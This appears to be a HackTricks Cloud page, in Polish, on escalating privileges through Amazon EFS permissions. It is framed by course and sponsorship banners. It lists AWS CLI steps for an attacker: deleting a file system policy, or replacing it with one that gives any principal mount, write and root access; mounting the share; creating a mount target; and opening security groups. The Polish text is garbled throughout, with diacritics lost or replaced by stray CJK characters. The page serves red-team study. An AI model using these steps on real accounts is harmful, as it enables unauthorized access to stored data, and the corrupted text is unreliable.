# AWS - EFS Privesc

{% hint style="success" %}
Ucz si i praktykuj Hacking w AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Ucz si i praktykuj Hacking w GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## EFS

Wicej **informacji o EFS** w:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

Pamitaj, 偶e aby zamontowa EFS, musisz znajdowa si w podsieci, w kt贸rej EFS jest wystawiony i mie do niego dostp (grupy zabezpiecze). Jeli tak si dzieje, domylnie zawsze bdziesz m贸g go zamontowa, jednak jeli jest chroniony przez zasady IAM, musisz mie dodatkowe uprawnienia wymienione tutaj, aby uzyska do niego dostp.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

Z dowolnymi z tych uprawnie atakujcy mo偶e **zmieni zasad systemu plik贸w**, aby da ci do niego dostp, lub po prostu **usun j**, aby zosta przyznany **domylny dostp**.

Aby usun zasad:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
Aby to zmieni:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

Z tym uprawnieniem atakujcy bdzie m贸g **zamontowa EFS**. Jeli uprawnienie do zapisu nie jest domylnie udzielane wszystkim, kt贸rzy mog zamontowa EFS, bdzie mia tylko **dostp do odczytu**.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
Dodatkowe uprawnienia `elasticfilesystem:ClientRootAccess` i `elasticfilesystem:ClientWrite` mog by u偶ywane do **zapisywania** w systemie plik贸w po jego zamontowaniu oraz do **dostpu** do tego systemu plik贸w **jako root**.

**Potencjalny wpyw:** Porednie podniesienie uprawnie poprzez zlokalizowanie wra偶liwych informacji w systemie plik贸w.

### `elasticfilesystem:CreateMountTarget`

Jeli atakujcy znajduje si w **podsieci**, gdzie **nie istnieje 偶aden punkt montowania** EFS, mo偶e po prostu **utworzy taki w swojej podsieci** przy u偶yciu tego uprawnienia:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**Potencjalne skutki:** Porednie eskalowanie uprawnie poprzez zlokalizowanie wra偶liwych informacji w systemie plik贸w.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

W scenariuszu, w kt贸rym atakujcy odkryje, 偶e EFS ma punkt montowania w swojej podsieci, ale **偶adna grupa zabezpiecze nie zezwala na ruch**, mo偶e po prostu **zmieni to, modyfikujc wybrane grupy zabezpiecze**:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**Potencjalny wpyw:** Porednie eskalowanie uprawnie poprzez zlokalizowanie wra偶liwych informacji w systemie plik贸w.



{% hint style="success" %}
Dowiedz si i praktykuj Hacking AWS:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Dowiedz si i praktykuj Hacking GCP: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Udostpnij sztuczki hakerskie, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
